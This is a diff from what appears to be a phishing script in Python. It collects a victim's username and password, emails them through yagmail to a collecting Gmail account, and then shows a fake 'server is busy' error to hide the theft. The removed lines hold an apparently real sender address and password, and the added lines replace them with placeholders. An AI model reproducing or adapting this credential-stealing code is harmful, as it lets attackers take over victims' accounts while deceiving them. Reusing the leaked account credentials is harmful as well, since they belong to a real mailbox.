@@ -19,8 +19,8 @@ password=str(input(colored('Password: ','yellow')))
 
 subject='account target'
 body=('username: '+username,'password: '+password)
-x=yagmail.SMTP('cacacrackphiss@gmail.com','jeager1999$')
-x.send('cacacrack000@gmail.com',subject,body)
+x=yagmail.SMTP('email_sender@gmail.com','password')
+x.send('email_receiver@gmail.com',subject,body)
 
 print(colored('Error','red'))
 print(colored('Sorry, server is busy','red'))
